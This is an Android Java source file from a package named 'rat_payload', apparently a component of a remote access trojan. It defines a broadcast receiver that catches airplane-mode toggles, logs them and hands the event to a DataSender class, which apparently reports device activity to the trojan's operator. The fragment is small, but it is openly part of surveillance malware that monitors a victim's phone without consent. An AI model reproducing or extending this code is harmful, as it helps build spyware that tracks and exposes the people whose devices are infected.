package com.app.rat_payload.receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;
import android.view.MotionEvent;
import android.view.View;

import com.app.rat_payload.utils.DataSender;

/**
 * Created by anirudh on 12/26/16.
 */

public class ArplnModeReceiver extends BroadcastReceiver {

    private static final String TAG = ArplnModeReceiver.class.getSimpleName();

    @Override
    public void onReceive(Context context, Intent intent) {
        Log.i(TAG, "Toggled Airplane Mode.");

        new DataSender().execute("Toggled Airplane Mode");

    }
}
